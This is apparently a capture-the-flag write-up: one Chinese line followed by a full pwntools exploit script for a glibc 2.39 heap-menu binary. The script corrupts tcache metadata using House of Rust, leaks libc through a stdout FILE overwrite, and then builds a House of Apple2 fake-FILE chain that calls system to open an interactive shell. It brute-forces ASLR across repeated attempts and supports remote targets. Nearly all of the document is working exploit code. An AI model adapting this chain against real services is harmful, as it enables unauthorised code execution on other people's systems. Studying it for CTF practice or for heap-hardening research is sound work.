House of Rust做泄露和任意写，打apple2即可

```python
#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = args.LOG or "info"


def arg_int(name, default=0):
    val = args.get(name)
    if val in (None, False, b"", ""):
        return default
    if val is True:
        return default
    return int(val, 0)


def arg_set(name):
    return args.get(name) not in (None, False, b"", "")


def start():
    if args.REMOTE:
        host = args.HOST or "127.0.0.1"
        port = int(args.PORT or 1337)
        return remote(host, port)
    return process([exe.path], aslr=not args.NOASLR)


def add(io, idx, choice):
    io.sendlineafter(b"Your choice > ", b"1")
    io.sendlineafter(b"input index: ", str(idx).encode())
    io.sendlineafter(b"choice: ", str(choice).encode())


def delete(io, idx):
    io.sendlineafter(b"Your choice > ", b"2")
    io.sendlineafter(b"input index: ", str(idx).encode())


def edit(io, idx, data):
    io.sendlineafter(b"Your choice > ", b"3")
    io.sendlineafter(b"input index: ", str(idx).encode())
    io.sendafter(b"Data: ", data)


def low16(x):
    return p16(x & 0xffff)


def write_low16_at(io, idx, off, value, fill=b"A"):
    edit(io, idx, fill * off + low16(value))


def forge_initial_large_chunks(io):
    # Fixed layout:
    #   p1 fake header = heap+0x360, size 0x4e0
    #   p2 fake header = heap+0xa10, size 0x4d0
    # Index 0 and 8 are kept as the overflow chunks for p1 and p2.
    add(io, 0, 1)
    add(io, 1, 1)
    for i in range(2, 7):
        add(io, i, 1)
    add(io, 7, 2)

    add(io, 8, 1)
    add(io, 9, 2)
    add(io, 10, 2)
    add(io, 11, 2)
    add(io, 12, 2)
    add(io, 13, 1)
    add(io, 14, 2)

    edit(io, 6, b"A" * 0xc0 + p64(0x4e0) + p64(0x101))
    edit(io, 0, b"B" * 0xc0 + p64(0) + p64(0x4e1))
    edit(io, 13, b"C" * 0xc0 + p64(0x4d0) + p64(0x101))
    edit(io, 8, b"D" * 0xc0 + p64(0) + p64(0x4d1))


def build_reordered_smallbin(io):
    # Build five W/V pairs after p1/p2 while p1 and p2 are still allocated.
    # This avoids the glibc-2.39 allocator scanning a deliberately corrupted
    # largebin during ordinary small allocations.
    for widx, vidx in [(2, 3), (4, 5), (6, 7), (10, 11), (12, 13)]:
        add(io, widx, 1)
        add(io, vidx, 1)
    add(io, 14, 1)
    add(io, 15, 1)

    # Fill tcache[0xd0], then free only the V chunks so they sort to smallbin.
    for i in [2, 4, 6, 10, 12, 14, 15]:
        delete(io, i)
    for i in [3, 5, 7, 11, 13]:
        delete(io, i)
    add(io, 15, 4)

    # Drain tcache.  The order recovers index 6 as the W chunk immediately
    # before V3 (heap+0x1590), so idx6 can overwrite V3->bk.
    for i in [2, 4, 12, 6, 10, 14, 15]:
        add(io, i, 1)


def prepare_100_tcache(io):
    # Everything after the largebin write must be served from tcache or an
    # already-prepared bin.  Prepare the 0x100 tcache before corrupting
    # largebin, plus two live reserve chunks used to refill it later.
    add(io, 10, 2)
    add(io, 14, 2)
    for i in [2, 4, 5, 7, 11, 12, 13]:
        add(io, i, 2)
    for i in [2, 4, 5, 7, 11, 12, 13]:
        delete(io, i)


def late_largebin_write_to_fake_bk(io, heap_low):
    # Build p1 = fake 0x4e0 and p2 = fake 0x4d0.  Inserting p2 as the
    # new smallest largebin chunk writes p2's chunk header to the fake
    # tcache chunk's bk field.  The fake header is heap+0x80, so its user
    # pointer is heap+0x90, exactly the start of tcache->entries.  Keeping the
    # fake user out of tcache->counts avoids corrupting size classes that are
    # still needed while the stashing chain runs.
    fake_hdr = heap_low + 0x80

    # Sort p1 into largebin.
    delete(io, 1)
    add(io, 15, 3)

    # Put p2 in unsorted, then corrupt p1->bk_nextsize to tcache-0x18.
    delete(io, 9)
    edit(io, 0, b"E" * 0xc0 + p64(0) + p64(0x4e1) + p64(0) * 3 + low16(fake_hdr - 0x20 + 0x18))

    # Trigger insertion of p2 into largebin.  If heap_low is wrong this usually
    # dies here or in the next allocator operation.
    add(io, 15, 3)


def get_tcache_metadata_chunk(io, heap_low):
    fake_hdr = heap_low + 0x80

    # Put p2 after the fake tcache chunk, then continue through the real V4
    # chunk.  Pointing p2 backwards makes glibc 2.39 re-read a chunk whose
    # bk was already replaced by tcache_key and crashes.
    edit(io, 8, b"F" * 0xc0 + p64(0) + p64(0x4d1) + p64(0) + low16(heap_low + 0x1730))

    # V3->bk = fake metadata chunk header.  idx6 is the W chunk before V3.
    edit(io, 6, b"G" * 0xc0 + p64(0) + p64(0xd1) + p64(0) + low16(fake_hdr))

    if args.STAGE == "pre_tsu":
        if args.PAUSE:
            pause()
        io.interactive()
        return

    add(io, 1, 1)          # returns V0 and stashes V1,V2,V3,fake,p2,V4
    add(io, 2, 1)          # V4
    add(io, 3, 1)          # p2
    add(io, 4, 1)          # heap+0x90, tcache->entries


def house_of_rust_metadata(io, heap_low):
    forge_initial_large_chunks(io)
    build_reordered_smallbin(io)
    prepare_100_tcache(io)
    late_largebin_write_to_fake_bk(io, heap_low)
    get_tcache_metadata_chunk(io, heap_low)


def add_100_tcache_entry(io, idx):
    add(io, idx, 2)
    delete(io, idx)


def write_libc_ptr_into_entry14(io, heap_low):
    # entries[11] is not 16-byte aligned, so use the 0x100 tcache bin instead.
    # entries[14] is heap+0x100 and can be returned by malloc(0xf0).  Sorting a
    # fake 0x100 chunk whose user is heap+0x100 writes a libc smallbin pointer
    # directly into entries[14].
    fake_user = heap_low + 0x100
    fake_hdr = fake_user - 0x10
    helper_user = heap_low + 0x180
    next_hdr = fake_hdr + 0x100

    edit(io, 4, flat({
        fake_hdr - (heap_low + 0x90): p64(0) + p64(0x101),
        0x70: low16(fake_user),
    }, filler=b"\0"))
    add(io, 5, 2)          # heap+0x100

    edit(io, 4, flat({
        fake_hdr - (heap_low + 0x90): p64(0) + p64(0x101),
        helper_user - 0x10 - (heap_low + 0x90): p64(0) + p64(0x101),
    }, filler=b"\0"))

    # Allocating heap+0x100 consumes entry[14] itself as user data.  Re-seed
    # entry[14] with a real 0x100 tcache chunk, then use idx5's overlap to
    # change only the low 16 bits to heap+0x180.
    delete(io, 10)
    edit(io, 5, low16(helper_user))
    add(io, 7, 2)          # heap+0x180, just to write the next headers

    edit(io, 4, flat({
        fake_hdr - (heap_low + 0x90): p64(0) + p64(0x101),
    }, filler=b"\0"))
    edit(io, 7, flat({
        next_hdr - helper_user: flat({
            0x00: p64(0x100) + p64(0x21),
            0x20: p64(0x20) + p64(0x21),
        }, filler=b"\0"),
    }, filler=b"\0"))

    # Refill tcache[0x100] from the remaining reserve chunk.  Freeing the fake chunk
    # then bypasses tcache and goes to unsorted, whose fd/bk are libc pointers
    # written directly over entries[14]/entries[15].
    delete(io, 14)

    delete(io, 5)


def leak_libc(io, heap_low, libc_low_nibble):
    stdout_low16 = (((libc_low_nibble & 0xf) << 12) + libc.sym["_IO_2_1_stdout_"]) & 0xffff
    write_low16_at(io, 4, 0x70, stdout_low16, b"S")
    add(io, 6, 2)          # _IO_2_1_stdout_

    # Classic stdout leak.  The final short byte backs _IO_write_base up while
    # keeping the rest of the FILE object intact.
    edit(io, 6, p64(0xFBAD1800) + p64(0) * 3 + b"\x00")
    data = io.recvuntil(b"Chunk edited.\n", timeout=2, drop=False)
    leak = data.rsplit(b"Chunk edited.\n", 1)[0]
    log.info("raw stdout leak: %s", leak[:0x80].hex())
    ptrs = []
    for i in range(0, max(0, len(leak) - 7)):
        val = u64(leak[i:i + 8].ljust(8, b"\0"))
        if (val >> 40) in (0x7f, 0x7e):
            ptrs.append(val)
    if not ptrs:
        raise EOFError("no libc pointer in stdout leak")
    libc.address = ptrs[0] - (libc.sym["_IO_2_1_stdout_"] + 0x84)
    log.success("libc leak %#x, base %#x", ptrs[0], libc.address)
    return libc.address


OFF_FILE_FLAGS = 0x00
OFF_FILE_WRITE_BASE = 0x20
OFF_FILE_WRITE_PTR = 0x28
OFF_FILE_CHAIN = 0x68
OFF_FILE_LOCK = 0x88
OFF_FILE_WIDE_DATA = 0xa0
OFF_FILE_MODE = 0xc0
OFF_FILE_VTABLE = 0xd8

OFF_WIDE_WRITE_BASE = 0x18
OFF_WIDE_WRITE_PTR = 0x20
OFF_WIDE_BUF_BASE = 0x30
OFF_WIDE_VTABLE = 0xe0
OFF_JUMP_DOALLOCATE = 0x68


def malloc_100_at(io, idx, addr):
    # After the stdout leak, tcache[0x100] still has a positive count.  Rewrite
    # only entries[14], then let malloc(0xf0) hand us an arbitrary libc target.
    edit(io, 4, flat({0x70: p64(addr)}, filler=b"\0"))
    add(io, idx, 2)


def build_fake_file(wide_data, lock, cmd=b"  sh -i\0"):
    if len(cmd) > OFF_FILE_WRITE_BASE:
        raise ValueError("Apple2 command must fit before _IO_write_base")
    return flat({
        OFF_FILE_FLAGS: cmd,
        OFF_FILE_WRITE_BASE: p64(0),
        OFF_FILE_WRITE_PTR: p64(0),
        OFF_FILE_CHAIN: p64(0),
        OFF_FILE_LOCK: p64(lock),
        OFF_FILE_WIDE_DATA: p64(wide_data),
        OFF_FILE_MODE: p32(1),
        OFF_FILE_VTABLE: p64(libc.sym["_IO_wfile_jumps"]),
    }, filler=b"\0", length=OFF_FILE_VTABLE + 8)


def build_fake_wide_data(wide_vtable):
    return flat({
        OFF_WIDE_WRITE_BASE: p64(0),
        OFF_WIDE_WRITE_PTR: p64(1),
        OFF_WIDE_BUF_BASE: p64(0),
        OFF_WIDE_VTABLE: p64(wide_vtable),
    }, filler=b"\0", length=OFF_WIDE_VTABLE + 8)


def build_fake_wide_vtable():
    return flat({
        OFF_JUMP_DOALLOCATE: p64(libc.sym["system"]),
    }, filler=b"\0", length=OFF_JUMP_DOALLOCATE + 8)


def house_of_apple2(io, cmd=b"  sh -i\0"):
    fake_file = libc.sym["_IO_2_1_stderr_"]
    wide_data = libc.address + 0x204800
    wide_vtable = libc.address + 0x204900
    lock = libc.address + 0x204b00

    log.info("fake stderr FILE %#x", fake_file)
    log.info("fake wide_data %#x", wide_data)
    log.info("fake wide_vtable %#x", wide_vtable)

    malloc_100_at(io, 11, wide_data)
    edit(io, 11, build_fake_wide_data(wide_vtable))

    malloc_100_at(io, 12, wide_vtable)
    edit(io, 12, build_fake_wide_vtable())

    malloc_100_at(io, 13, fake_file)
    edit(io, 13, build_fake_file(wide_data, lock, cmd))

    io.sendlineafter(b"Your choice > ", b"4")


def run_attempt(brute, libc_brute):
    heap_low = (brute & 0xf) << 12
    libc_brute &= 0xf
    log.info("trying heap low16 %#x libc nibble %#x", heap_low, libc_brute)

    io = start()
    try:
        house_of_rust_metadata(io, heap_low)

        if args.STAGE == "mark":
            log.success("METADATA_OK")
            io.close()
            return None

        if args.STAGE in ("meta", "pre_tsu"):
            if args.PAUSE:
                pause()
            return io

        write_libc_ptr_into_entry14(io, heap_low)
        if args.STAGE == "mark_preleak":
            log.success("PRELEAK_OK")
            io.close()
            return None

        if args.STAGE == "pre_leak":
            if args.PAUSE:
                pause()
            return io

        leak_libc(io, heap_low, libc_brute)
        if args.STAGE == "mark_leak":
            log.success("LEAK_OK %#x", libc.address)
            io.close()
            return None

        cmd = b"  sh -c 'echo PWNED; sh'\0" if args.STAGE == "mark_pwn" else b"  sh -i\0"
        house_of_apple2(io, cmd)
        if args.STAGE == "mark_pwn":
            data = io.recvuntil(b"PWNED", timeout=3, drop=False)
            if b"PWNED" not in data:
                raise EOFError("shell marker not received")
            log.success("PWN_OK %r", data[-0x80:])
            io.close()
            return None

        if args.PAUSE:
            pause()

        return io
    except Exception:
        io.close()
        raise


def main():
    debug_stages = {"mark", "meta", "pre_tsu", "mark_preleak", "pre_leak", "mark_leak"}
    auto = not arg_set("BRUTE") and not arg_set("LBRUTE") and args.STAGE not in debug_stages

    if not auto:
        io = run_attempt(arg_int("BRUTE"), arg_int("LBRUTE"))
        if io is not None:
            io.interactive()
        return

    max_tries = arg_int("MAX_TRIES", 0)
    attempt = 0
    while max_tries == 0 or attempt < max_tries:
        brute = attempt & 0xf
        libc_brute = (attempt >> 4) & 0xf
        try:
            io = run_attempt(brute, libc_brute)
            if io is not None:
                io.interactive()
            return
        except Exception as exc:
            log.info("attempt %d failed: %s", attempt, exc)
            attempt += 1

    log.error("exhausted %d attempts", max_tries)


if __name__ == "__main__":
    main()
```